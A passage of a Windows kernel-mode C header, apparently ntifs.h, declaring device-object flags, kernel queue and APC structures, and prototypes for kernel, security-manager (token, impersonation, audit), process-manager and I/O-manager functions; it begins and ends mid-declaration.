FsRtlNotifyStreamFileObject(
  IN struct _FILE_OBJECT * StreamFileObject,
  IN struct _DEVICE_OBJECT *DeviceObjectHint OPTIONAL,
  IN FS_FILTER_STREAM_FO_NOTIFICATION_TYPE NotificationType,
  IN BOOLEAN SafeToRecurse);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#define DO_VERIFY_VOLUME                    0x00000002
#define DO_BUFFERED_IO                      0x00000004
#define DO_EXCLUSIVE                        0x00000008
#define DO_DIRECT_IO                        0x00000010
#define DO_MAP_IO_BUFFER                    0x00000020
#define DO_DEVICE_HAS_NAME                  0x00000040
#define DO_DEVICE_INITIALIZING              0x00000080
#define DO_SYSTEM_BOOT_PARTITION            0x00000100
#define DO_LONG_TERM_REQUESTS               0x00000200
#define DO_NEVER_LAST_DEVICE                0x00000400
#define DO_SHUTDOWN_REGISTERED              0x00000800
#define DO_BUS_ENUMERATED_DEVICE            0x00001000
#define DO_POWER_PAGABLE                    0x00002000
#define DO_POWER_INRUSH                     0x00004000
#define DO_LOW_PRIORITY_FILESYSTEM          0x00010000
#define DO_SUPPORTS_TRANSACTIONS            0x00040000
#define DO_FORCE_NEITHER_IO                 0x00080000
#define DO_VOLUME_DEVICE_OBJECT             0x00100000
#define DO_SYSTEM_SYSTEM_PARTITION          0x00200000
#define DO_SYSTEM_CRITICAL_PARTITION        0x00400000
#define DO_DISALLOW_EXECUTE                 0x00800000

extern KSPIN_LOCK                   IoStatisticsLock;
extern ULONG                        IoReadOperationCount;
extern ULONG                        IoWriteOperationCount;
extern ULONG                        IoOtherOperationCount;
extern LARGE_INTEGER                IoReadTransferCount;
extern LARGE_INTEGER                IoWriteTransferCount;
extern LARGE_INTEGER                IoOtherTransferCount;

#define IO_FILE_OBJECT_NON_PAGED_POOL_CHARGE    64
#define IO_FILE_OBJECT_PAGED_POOL_CHARGE        1024

#if (NTDDI_VERSION >= NTDDI_VISTA)
typedef struct _IO_PRIORITY_INFO {
  ULONG Size;
  ULONG ThreadPriority;
  ULONG PagePriority;
  IO_PRIORITY_HINT IoPriority;
} IO_PRIORITY_INFO, *PIO_PRIORITY_INFO;
#endif

typedef struct _PUBLIC_OBJECT_BASIC_INFORMATION {
  ULONG Attributes;
  ACCESS_MASK GrantedAccess;
  ULONG HandleCount;
  ULONG PointerCount;
  ULONG Reserved[10];
} PUBLIC_OBJECT_BASIC_INFORMATION, *PPUBLIC_OBJECT_BASIC_INFORMATION;

typedef struct _PUBLIC_OBJECT_TYPE_INFORMATION {
  UNICODE_STRING TypeName;
  ULONG Reserved [22];
} PUBLIC_OBJECT_TYPE_INFORMATION, *PPUBLIC_OBJECT_TYPE_INFORMATION;

typedef struct _SECURITY_CLIENT_CONTEXT {
  SECURITY_QUALITY_OF_SERVICE SecurityQos;
  PACCESS_TOKEN ClientToken;
  BOOLEAN DirectlyAccessClientToken;
  BOOLEAN DirectAccessEffectiveOnly;
  BOOLEAN ServerIsRemote;
  TOKEN_CONTROL ClientTokenControl;
} SECURITY_CLIENT_CONTEXT, *PSECURITY_CLIENT_CONTEXT;

#define SYSTEM_PAGE_PRIORITY_BITS       3
#define SYSTEM_PAGE_PRIORITY_LEVELS     (1 << SYSTEM_PAGE_PRIORITY_BITS)

typedef struct _KAPC_STATE {
  LIST_ENTRY ApcListHead[MaximumMode];
  PKPROCESS Process;
  BOOLEAN KernelApcInProgress;
  BOOLEAN KernelApcPending;
  BOOLEAN UserApcPending;
} KAPC_STATE, *PKAPC_STATE, *RESTRICTED_POINTER PRKAPC_STATE;

#define KAPC_STATE_ACTUAL_LENGTH (FIELD_OFFSET(KAPC_STATE, UserApcPending) + sizeof(BOOLEAN))

#define ASSERT_QUEUE(Q) ASSERT(((Q)->Header.Type & KOBJECT_TYPE_MASK) == QueueObject);

typedef struct _KQUEUE {
  DISPATCHER_HEADER Header;
  LIST_ENTRY EntryListHead;
  volatile ULONG CurrentCount;
  ULONG MaximumCount;
  LIST_ENTRY ThreadListHead;
} KQUEUE, *PKQUEUE, *RESTRICTED_POINTER PRKQUEUE;

/******************************************************************************
 *                              Kernel Functions                              *
 ******************************************************************************/

NTSTATUS
NTAPI
KeGetProcessorNumberFromIndex(
  IN ULONG ProcIndex,
  OUT PPROCESSOR_NUMBER ProcNumber);

ULONG
NTAPI
KeGetProcessorIndexFromNumber(
  IN PPROCESSOR_NUMBER ProcNumber);

#if (NTDDI_VERSION >= NTDDI_WIN2K)




NTKERNELAPI
VOID
NTAPI
KeInitializeMutant(
  OUT PRKMUTANT Mutant,
  IN BOOLEAN InitialOwner);

NTKERNELAPI
LONG
NTAPI
KeReadStateMutant(
  IN PRKMUTANT Mutant);

NTKERNELAPI
LONG
NTAPI
KeReleaseMutant(
  IN OUT PRKMUTANT Mutant,
  IN KPRIORITY Increment,
  IN BOOLEAN Abandoned,
  IN BOOLEAN Wait);

NTKERNELAPI
VOID
NTAPI
KeInitializeQueue(
  OUT PRKQUEUE Queue,
  IN ULONG Count);

NTKERNELAPI
LONG
NTAPI
KeReadStateQueue(
  IN PRKQUEUE Queue);

NTKERNELAPI
LONG
NTAPI
KeInsertQueue(
  IN OUT PRKQUEUE Queue,
  IN OUT PLIST_ENTRY Entry);

NTKERNELAPI
LONG
NTAPI
KeInsertHeadQueue(
  IN OUT PRKQUEUE Queue,
  IN OUT PLIST_ENTRY Entry);

NTKERNELAPI
PLIST_ENTRY
NTAPI
KeRemoveQueue(
  IN OUT PRKQUEUE Queue,
  IN KPROCESSOR_MODE WaitMode,
  IN PLARGE_INTEGER Timeout OPTIONAL);

NTKERNELAPI
VOID
NTAPI
KeAttachProcess(
  IN OUT PKPROCESS Process);

NTKERNELAPI
VOID
NTAPI
KeDetachProcess(
  VOID);

NTKERNELAPI
PLIST_ENTRY
NTAPI
KeRundownQueue(
  IN OUT PRKQUEUE Queue);

NTKERNELAPI
VOID
NTAPI
KeStackAttachProcess(
  IN OUT PKPROCESS Process,
  OUT PKAPC_STATE ApcState);

NTKERNELAPI
VOID
NTAPI
KeUnstackDetachProcess(
  IN PKAPC_STATE ApcState);

NTKERNELAPI
UCHAR
NTAPI
KeSetIdealProcessorThread(
  IN OUT PKTHREAD Thread,
  IN UCHAR Processor);

NTKERNELAPI
BOOLEAN
NTAPI
KeSetKernelStackSwapEnable(
  IN BOOLEAN Enable);

#if defined(_X86_)
NTHALAPI
KIRQL
FASTCALL
KeAcquireSpinLockRaiseToSynch(
  IN OUT PKSPIN_LOCK SpinLock);
#else
NTKERNELAPI
KIRQL
KeAcquireSpinLockRaiseToSynch(
  IN OUT PKSPIN_LOCK SpinLock);
#endif

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

_DECL_HAL_KE_IMPORT
KIRQL
FASTCALL
KeAcquireQueuedSpinLock(
  IN OUT KSPIN_LOCK_QUEUE_NUMBER Number);

_DECL_HAL_KE_IMPORT
VOID
FASTCALL
KeReleaseQueuedSpinLock(
  IN OUT KSPIN_LOCK_QUEUE_NUMBER Number,
  IN KIRQL OldIrql);

_DECL_HAL_KE_IMPORT
LOGICAL
FASTCALL
KeTryToAcquireQueuedSpinLock(
  IN KSPIN_LOCK_QUEUE_NUMBER Number,
  OUT PKIRQL OldIrql);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */



#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
VOID
KeQueryOwnerMutant(
  IN PKMUTANT Mutant,
  OUT PCLIENT_ID ClientId);

NTKERNELAPI
ULONG
KeRemoveQueueEx (
  IN OUT PKQUEUE Queue,
  IN KPROCESSOR_MODE WaitMode,
  IN BOOLEAN Alertable,
  IN PLARGE_INTEGER Timeout OPTIONAL,
  OUT PLIST_ENTRY *EntryArray,
  IN ULONG Count);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */



#define INVALID_PROCESSOR_INDEX     0xffffffff

#define EX_PUSH_LOCK ULONG_PTR
#define PEX_PUSH_LOCK PULONG_PTR

/******************************************************************************
 *                          Executive Functions                               *
 ******************************************************************************/

#define ExDisableResourceBoost ExDisableResourceBoostLite

VOID
ExInitializePushLock (
  OUT PEX_PUSH_LOCK PushLock);

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
SIZE_T
NTAPI
ExQueryPoolBlockSize(
  IN PVOID PoolBlock,
  OUT PBOOLEAN QuotaCharged);

VOID
ExAdjustLookasideDepth(
  VOID);

NTKERNELAPI
VOID
NTAPI
ExDisableResourceBoostLite(
  IN PERESOURCE Resource);
#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */

#if (NTDDI_VERSION >= NTDDI_WINXP)

PSLIST_ENTRY
FASTCALL
InterlockedPushListSList(
  IN OUT PSLIST_HEADER ListHead,
  IN OUT PSLIST_ENTRY List,
  IN OUT PSLIST_ENTRY ListEnd,
  IN ULONG Count);
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

/******************************************************************************
 *                            Security Manager Functions                      *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
VOID
NTAPI
SeReleaseSubjectContext(
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext);

NTKERNELAPI
BOOLEAN
NTAPI
SePrivilegeCheck(
  IN OUT PPRIVILEGE_SET RequiredPrivileges,
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext,
  IN KPROCESSOR_MODE AccessMode);

NTKERNELAPI
VOID
NTAPI
SeOpenObjectAuditAlarm(
  IN PUNICODE_STRING ObjectTypeName,
  IN PVOID Object OPTIONAL,
  IN PUNICODE_STRING AbsoluteObjectName OPTIONAL,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PACCESS_STATE AccessState,
  IN BOOLEAN ObjectCreated,
  IN BOOLEAN AccessGranted,
  IN KPROCESSOR_MODE AccessMode,
  OUT PBOOLEAN GenerateOnClose);

NTKERNELAPI
VOID
NTAPI
SeOpenObjectForDeleteAuditAlarm(
  IN PUNICODE_STRING ObjectTypeName,
  IN PVOID Object OPTIONAL,
  IN PUNICODE_STRING AbsoluteObjectName OPTIONAL,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PACCESS_STATE AccessState,
  IN BOOLEAN ObjectCreated,
  IN BOOLEAN AccessGranted,
  IN KPROCESSOR_MODE AccessMode,
  OUT PBOOLEAN GenerateOnClose);

NTKERNELAPI
VOID
NTAPI
SeDeleteObjectAuditAlarm(
  IN PVOID Object,
  IN HANDLE Handle);

NTKERNELAPI
TOKEN_TYPE
NTAPI
SeTokenType(
  IN PACCESS_TOKEN Token);

NTKERNELAPI
BOOLEAN
NTAPI
SeTokenIsAdmin(
  IN PACCESS_TOKEN Token);

NTKERNELAPI
BOOLEAN
NTAPI
SeTokenIsRestricted(
  IN PACCESS_TOKEN Token);

NTKERNELAPI
NTSTATUS
NTAPI
SeQueryAuthenticationIdToken(
  IN PACCESS_TOKEN Token,
  OUT PLUID AuthenticationId);

NTKERNELAPI
NTSTATUS
NTAPI
SeQuerySessionIdToken(
  IN PACCESS_TOKEN Token,
  OUT PULONG SessionId);

NTKERNELAPI
NTSTATUS
NTAPI
SeCreateClientSecurity(
  IN PETHREAD ClientThread,
  IN PSECURITY_QUALITY_OF_SERVICE ClientSecurityQos,
  IN BOOLEAN RemoteSession,
  OUT PSECURITY_CLIENT_CONTEXT ClientContext);

NTKERNELAPI
VOID
NTAPI
SeImpersonateClient(
  IN PSECURITY_CLIENT_CONTEXT ClientContext,
  IN PETHREAD ServerThread OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
SeImpersonateClientEx(
  IN PSECURITY_CLIENT_CONTEXT ClientContext,
  IN PETHREAD ServerThread OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
SeCreateClientSecurityFromSubjectContext(
  IN PSECURITY_SUBJECT_CONTEXT SubjectContext,
  IN PSECURITY_QUALITY_OF_SERVICE ClientSecurityQos,
  IN BOOLEAN ServerIsRemote,
  OUT PSECURITY_CLIENT_CONTEXT ClientContext);

NTKERNELAPI
NTSTATUS
NTAPI
SeQuerySecurityDescriptorInfo(
  IN PSECURITY_INFORMATION SecurityInformation,
  OUT PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN OUT PULONG Length,
  IN OUT PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor);

NTKERNELAPI
NTSTATUS
NTAPI
SeSetSecurityDescriptorInfo(
  IN PVOID Object OPTIONAL,
  IN PSECURITY_INFORMATION SecurityInformation,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN OUT PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor,
  IN POOL_TYPE PoolType,
  IN PGENERIC_MAPPING GenericMapping);

NTKERNELAPI
NTSTATUS
NTAPI
SeSetSecurityDescriptorInfoEx(
  IN PVOID Object OPTIONAL,
  IN PSECURITY_INFORMATION SecurityInformation,
  IN PSECURITY_DESCRIPTOR ModificationDescriptor,
  IN OUT PSECURITY_DESCRIPTOR *ObjectsSecurityDescriptor,
  IN ULONG AutoInheritFlags,
  IN POOL_TYPE PoolType,
  IN PGENERIC_MAPPING GenericMapping);

NTKERNELAPI
NTSTATUS
NTAPI
SeAppendPrivileges(
  IN OUT PACCESS_STATE AccessState,
  IN PPRIVILEGE_SET Privileges);

NTKERNELAPI
BOOLEAN
NTAPI
SeAuditingFileEvents(
  IN BOOLEAN AccessGranted,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);

NTKERNELAPI
BOOLEAN
NTAPI
SeAuditingFileOrGlobalEvents(
  IN BOOLEAN AccessGranted,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSECURITY_SUBJECT_CONTEXT SubjectSecurityContext);

VOID
NTAPI
SeSetAccessStateGenericMapping(
  IN OUT PACCESS_STATE AccessState,
  IN PGENERIC_MAPPING GenericMapping);

NTKERNELAPI
NTSTATUS
NTAPI
SeRegisterLogonSessionTerminatedRoutine(
  IN PSE_LOGON_SESSION_TERMINATED_ROUTINE CallbackRoutine);

NTKERNELAPI
NTSTATUS
NTAPI
SeUnregisterLogonSessionTerminatedRoutine(
  IN PSE_LOGON_SESSION_TERMINATED_ROUTINE CallbackRoutine);

NTKERNELAPI
NTSTATUS
NTAPI
SeMarkLogonSessionForTerminationNotification(
  IN PLUID LogonId);

NTKERNELAPI
NTSTATUS
NTAPI
SeQueryInformationToken(
  IN PACCESS_TOKEN Token,
  IN TOKEN_INFORMATION_CLASS TokenInformationClass,
  OUT PVOID *TokenInformation);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */
#if (NTDDI_VERSION >= NTDDI_WIN2KSP3)
NTKERNELAPI
BOOLEAN
NTAPI
SeAuditingHardLinkEvents(
  IN BOOLEAN AccessGranted,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor);
#endif

#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
NTSTATUS
NTAPI
SeFilterToken(
  IN PACCESS_TOKEN ExistingToken,
  IN ULONG Flags,
  IN PTOKEN_GROUPS SidsToDisable OPTIONAL,
  IN PTOKEN_PRIVILEGES PrivilegesToDelete OPTIONAL,
  IN PTOKEN_GROUPS RestrictedSids OPTIONAL,
  OUT PACCESS_TOKEN *FilteredToken);

NTKERNELAPI
VOID
NTAPI
SeAuditHardLinkCreation(
  IN PUNICODE_STRING FileName,
  IN PUNICODE_STRING LinkName,
  IN BOOLEAN bSuccess);

#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WINXPSP2)

NTKERNELAPI
BOOLEAN
NTAPI
SeAuditingFileEventsWithContext(
  IN BOOLEAN AccessGranted,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSECURITY_SUBJECT_CONTEXT SubjectSecurityContext OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
SeAuditingHardLinkEventsWithContext(
  IN BOOLEAN AccessGranted,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSECURITY_SUBJECT_CONTEXT SubjectSecurityContext OPTIONAL);

#endif


#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
VOID
NTAPI
SeOpenObjectAuditAlarmWithTransaction(
  IN PUNICODE_STRING ObjectTypeName,
  IN PVOID Object OPTIONAL,
  IN PUNICODE_STRING AbsoluteObjectName OPTIONAL,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PACCESS_STATE AccessState,
  IN BOOLEAN ObjectCreated,
  IN BOOLEAN AccessGranted,
  IN KPROCESSOR_MODE AccessMode,
  IN GUID *TransactionId OPTIONAL,
  OUT PBOOLEAN GenerateOnClose);

NTKERNELAPI
VOID
NTAPI
SeOpenObjectForDeleteAuditAlarmWithTransaction(
  IN PUNICODE_STRING ObjectTypeName,
  IN PVOID Object OPTIONAL,
  IN PUNICODE_STRING AbsoluteObjectName OPTIONAL,
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PACCESS_STATE AccessState,
  IN BOOLEAN ObjectCreated,
  IN BOOLEAN AccessGranted,
  IN KPROCESSOR_MODE AccessMode,
  IN GUID *TransactionId OPTIONAL,
  OUT PBOOLEAN GenerateOnClose);

NTKERNELAPI
VOID
NTAPI
SeExamineSacl(
  IN PACL Sacl,
  IN PACCESS_TOKEN Token,
  IN ACCESS_MASK DesiredAccess,
  IN BOOLEAN AccessGranted,
  OUT PBOOLEAN GenerateAudit,
  OUT PBOOLEAN GenerateAlarm);

NTKERNELAPI
VOID
NTAPI
SeDeleteObjectAuditAlarmWithTransaction(
  IN PVOID Object,
  IN HANDLE Handle,
  IN GUID *TransactionId OPTIONAL);

NTKERNELAPI
VOID
NTAPI
SeQueryTokenIntegrity(
  IN PACCESS_TOKEN Token,
  IN OUT PSID_AND_ATTRIBUTES IntegritySA);

NTKERNELAPI
NTSTATUS
NTAPI
SeSetSessionIdToken(
  IN PACCESS_TOKEN Token,
  IN ULONG SessionId);

NTKERNELAPI
VOID
NTAPI
SeAuditHardLinkCreationWithTransaction(
  IN PUNICODE_STRING FileName,
  IN PUNICODE_STRING LinkName,
  IN BOOLEAN bSuccess,
  IN GUID *TransactionId OPTIONAL);

NTKERNELAPI
VOID
NTAPI
SeAuditTransactionStateChange(
  IN GUID *TransactionId,
  IN GUID *ResourceManagerId,
  IN ULONG NewTransactionState);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_VISTA || (NTDDI_VERSION >= NTDDI_WINXPSP2 && NTDDI_VERSION < NTDDI_WS03))
NTKERNELAPI
BOOLEAN
NTAPI
SeTokenIsWriteRestricted(
  IN PACCESS_TOKEN Token);
#endif

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
BOOLEAN
NTAPI
SeAuditingAnyFileEventsWithContext(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PSECURITY_SUBJECT_CONTEXT SubjectSecurityContext OPTIONAL);

NTKERNELAPI
VOID
NTAPI
SeExamineGlobalSacl(
  IN PUNICODE_STRING ObjectType,
  IN PACCESS_TOKEN Token,
  IN ACCESS_MASK DesiredAccess,
  IN BOOLEAN AccessGranted,
  IN OUT PBOOLEAN GenerateAudit,
  IN OUT PBOOLEAN GenerateAlarm OPTIONAL);

NTKERNELAPI
VOID
NTAPI
SeMaximumAuditMaskFromGlobalSacl(
  IN PUNICODE_STRING ObjectTypeName OPTIONAL,
  IN ACCESS_MASK GrantedAccess,
  IN PACCESS_TOKEN Token,
  IN OUT PACCESS_MASK AuditMask);

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

NTSTATUS
NTAPI
SeReportSecurityEventWithSubCategory(
  IN ULONG Flags,
  IN PUNICODE_STRING SourceName,
  IN PSID UserSid OPTIONAL,
  IN PSE_ADT_PARAMETER_ARRAY AuditParameters,
  IN ULONG AuditSubcategoryId);

BOOLEAN
NTAPI
SeAccessCheckFromState(
  IN PSECURITY_DESCRIPTOR SecurityDescriptor,
  IN PTOKEN_ACCESS_INFORMATION PrimaryTokenInformation,
  IN PTOKEN_ACCESS_INFORMATION ClientTokenInformation OPTIONAL,
  IN ACCESS_MASK DesiredAccess,
  IN ACCESS_MASK PreviouslyGrantedAccess,
  OUT PPRIVILEGE_SET *Privileges OPTIONAL,
  IN PGENERIC_MAPPING GenericMapping,
  IN KPROCESSOR_MODE AccessMode,
  OUT PACCESS_MASK GrantedAccess,
  OUT PNTSTATUS AccessStatus);

NTKERNELAPI
VOID
NTAPI
SeFreePrivileges(
  IN PPRIVILEGE_SET Privileges);

NTSTATUS
NTAPI
SeLocateProcessImageName(
  IN OUT PEPROCESS Process,
  OUT PUNICODE_STRING *pImageFileName);

#define SeLengthSid( Sid ) \
    (8 + (4 * ((SID *)Sid)->SubAuthorityCount))

#define SeDeleteClientSecurity(C)  {                                           \
            if (SeTokenType((C)->ClientToken) == TokenPrimary) {               \
                PsDereferencePrimaryToken( (C)->ClientToken );                 \
            } else {                                                           \
                PsDereferenceImpersonationToken( (C)->ClientToken );           \
            }                                                                  \
}

#define SeStopImpersonatingClient() PsRevertToSelf()

#define SeQuerySubjectContextToken( SubjectContext )                \
    ( ARGUMENT_PRESENT(                                             \
        ((PSECURITY_SUBJECT_CONTEXT) SubjectContext)->ClientToken   \
        ) ?                                                         \
    ((PSECURITY_SUBJECT_CONTEXT) SubjectContext)->ClientToken :     \
    ((PSECURITY_SUBJECT_CONTEXT) SubjectContext)->PrimaryToken )

extern NTKERNELAPI PSE_EXPORTS SeExports;
/******************************************************************************
 *                          Process Manager Functions                         *
 ******************************************************************************/

NTKERNELAPI
NTSTATUS
NTAPI
PsLookupProcessByProcessId(
  IN HANDLE ProcessId,
  OUT PEPROCESS *Process);

NTKERNELAPI
NTSTATUS
NTAPI
PsLookupThreadByThreadId(
  IN HANDLE UniqueThreadId,
  OUT PETHREAD *Thread);

#if (NTDDI_VERSION >= NTDDI_WIN2K)


NTKERNELAPI
PACCESS_TOKEN
NTAPI
PsReferenceImpersonationToken(
  IN OUT PETHREAD Thread,
  OUT PBOOLEAN CopyOnOpen,
  OUT PBOOLEAN EffectiveOnly,
  OUT PSECURITY_IMPERSONATION_LEVEL ImpersonationLevel);

NTKERNELAPI
LARGE_INTEGER
NTAPI
PsGetProcessExitTime(VOID);

NTKERNELAPI
BOOLEAN
NTAPI
PsIsThreadTerminating(
  IN PETHREAD Thread);

NTKERNELAPI
NTSTATUS
NTAPI
PsImpersonateClient(
  IN OUT PETHREAD Thread,
  IN PACCESS_TOKEN Token,
  IN BOOLEAN CopyOnOpen,
  IN BOOLEAN EffectiveOnly,
  IN SECURITY_IMPERSONATION_LEVEL ImpersonationLevel);

NTKERNELAPI
BOOLEAN
NTAPI
PsDisableImpersonation(
  IN OUT PETHREAD Thread,
  IN OUT PSE_IMPERSONATION_STATE ImpersonationState);

NTKERNELAPI
VOID
NTAPI
PsRestoreImpersonation(
  IN PETHREAD Thread,
  IN PSE_IMPERSONATION_STATE ImpersonationState);

NTKERNELAPI
VOID
NTAPI
PsRevertToSelf(VOID);

NTKERNELAPI
VOID
NTAPI
PsChargePoolQuota(
  IN PEPROCESS Process,
  IN POOL_TYPE PoolType,
  IN ULONG_PTR Amount);

NTKERNELAPI
VOID
NTAPI
PsReturnPoolQuota(
  IN PEPROCESS Process,
  IN POOL_TYPE PoolType,
  IN ULONG_PTR Amount);

NTKERNELAPI
NTSTATUS
NTAPI
PsAssignImpersonationToken(
  IN PETHREAD Thread,
  IN HANDLE Token OPTIONAL);

NTKERNELAPI
HANDLE
NTAPI
PsReferencePrimaryToken(
  IN OUT PEPROCESS Process);
#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */
#if (NTDDI_VERSION >= NTDDI_WINXP)


NTKERNELAPI
VOID
NTAPI
PsDereferencePrimaryToken(
  IN PACCESS_TOKEN PrimaryToken);

NTKERNELAPI
VOID
NTAPI
PsDereferenceImpersonationToken(
  IN PACCESS_TOKEN ImpersonationToken);

NTKERNELAPI
NTSTATUS
NTAPI
PsChargeProcessPoolQuota(
  IN PEPROCESS Process,
  IN POOL_TYPE PoolType,
  IN ULONG_PTR Amount);

NTKERNELAPI
BOOLEAN
NTAPI
PsIsSystemThread(
  IN PETHREAD Thread);
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

/******************************************************************************
 *                         I/O Manager Functions                              *
 ******************************************************************************/

#define IoIsFileOpenedExclusively(FileObject) ( \
    (BOOLEAN) !(                                \
    (FileObject)->SharedRead ||                 \
    (FileObject)->SharedWrite ||                \
    (FileObject)->SharedDelete                  \
    )                                           \
)

#if (NTDDI_VERSION == NTDDI_WIN2K)
NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterFsRegistrationChangeEx(
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_FS_NOTIFICATION DriverNotificationRoutine);
#endif
#if (NTDDI_VERSION >= NTDDI_WIN2K)


NTKERNELAPI
VOID
NTAPI
IoAcquireVpbSpinLock(
  OUT PKIRQL Irql);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckDesiredAccess(
  IN OUT PACCESS_MASK DesiredAccess,
  IN ACCESS_MASK GrantedAccess);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckEaBufferValidity(
  IN PFILE_FULL_EA_INFORMATION EaBuffer,
  IN ULONG EaLength,
  OUT PULONG ErrorOffset);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckFunctionAccess(
  IN ACCESS_MASK GrantedAccess,
  IN UCHAR MajorFunction,
  IN UCHAR MinorFunction,
  IN ULONG IoControlCode,
  IN PVOID Argument1 OPTIONAL,
  IN PVOID Argument2 OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckQuerySetFileInformation(
  IN FILE_INFORMATION_CLASS FileInformationClass,
  IN ULONG Length,
  IN BOOLEAN SetOperation);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckQuerySetVolumeInformation(
  IN FS_INFORMATION_CLASS FsInformationClass,
  IN ULONG Length,
  IN BOOLEAN SetOperation);

NTKERNELAPI
NTSTATUS
NTAPI
IoCheckQuotaBufferValidity(
  IN PFILE_QUOTA_INFORMATION QuotaBuffer,
  IN ULONG QuotaLength,
  OUT PULONG ErrorOffset);

NTKERNELAPI
PFILE_OBJECT
NTAPI
IoCreateStreamFileObject(
  IN PFILE_OBJECT FileObject OPTIONAL,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL);

NTKERNELAPI
PFILE_OBJECT
NTAPI
IoCreateStreamFileObjectLite(
  IN PFILE_OBJECT FileObject OPTIONAL,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL);

NTKERNELAPI
BOOLEAN
NTAPI
IoFastQueryNetworkAttributes(
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN ACCESS_MASK DesiredAccess,
  IN ULONG OpenOptions,
  OUT PIO_STATUS_BLOCK IoStatus,
  OUT PFILE_NETWORK_OPEN_INFORMATION Buffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoPageRead(
  IN PFILE_OBJECT FileObject,
  IN PMDL Mdl,
  IN PLARGE_INTEGER Offset,
  IN PKEVENT Event,
  OUT PIO_STATUS_BLOCK IoStatusBlock);

NTKERNELAPI
PDEVICE_OBJECT
NTAPI
IoGetBaseFileSystemDeviceObject(
  IN PFILE_OBJECT FileObject);

NTKERNELAPI
PCONFIGURATION_INFORMATION
NTAPI
IoGetConfigurationInformation(VOID);

NTKERNELAPI
ULONG
NTAPI
IoGetRequestorProcessId(
  IN PIRP Irp);

NTKERNELAPI
PEPROCESS
NTAPI
IoGetRequestorProcess(
  IN PIRP Irp);

NTKERNELAPI
PIRP
NTAPI
IoGetTopLevelIrp(VOID);

NTKERNELAPI
BOOLEAN
NTAPI
IoIsOperationSynchronous(
  IN PIRP Irp);

NTKERNELAPI
BOOLEAN
NTAPI
IoIsSystemThread(
  IN PETHREAD Thread);

NTKERNELAPI
BOOLEAN
NTAPI
IoIsValidNameGraftingBuffer(
  IN PIRP Irp,
  IN PREPARSE_DATA_BUFFER ReparseBuffer);

NTKERNELAPI
NTSTATUS
NTAPI
IoQueryFileInformation(
  IN PFILE_OBJECT FileObject,
  IN FILE_INFORMATION_CLASS FileInformationClass,
  IN ULONG Length,
  OUT PVOID FileInformation,
  OUT PULONG ReturnedLength);

NTKERNELAPI
NTSTATUS
NTAPI
IoQueryVolumeInformation(
  IN PFILE_OBJECT FileObject,
  IN FS_INFORMATION_CLASS FsInformationClass,
  IN ULONG Length,
  OUT PVOID FsInformation,
  OUT PULONG ReturnedLength);

NTKERNELAPI
VOID
NTAPI
IoQueueThreadIrp(
  IN PIRP Irp);

NTKERNELAPI
VOID
NTAPI
IoRegisterFileSystem(
  IN PDEVICE_OBJECT DeviceObject);

NTKERNELAPI
NTSTATUS
NTAPI
IoRegisterFsRegistrationChange(
  IN PDRIVER_OBJECT DriverObject,
  IN PDRIVER_FS_NOTIFICATION DriverNotificationRoutine);

NTKERNELAPI
VOID
NTAPI
IoReleaseVpbSpinLock(
  IN KIRQL Irql);

NTKERNELAPI
VOID
NTAPI
IoSetDeviceToVerify(
  IN PETHREAD Thread,
  IN PDEVICE_OBJECT DeviceObject OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoSetInformation(
  IN PFILE_OBJECT FileObject,
  IN FILE_INFORMATION_CLASS FileInformationClass,
  IN ULONG Length,
  IN PVOID FileInformation);

NTKERNELAPI
VOID
NTAPI
IoSetTopLevelIrp(
  IN PIRP Irp OPTIONAL);

NTKERNELAPI
NTSTATUS
NTAPI
IoSynchronousPageWrite(
  IN PFILE_OBJECT FileObject,
  IN PMDL Mdl,
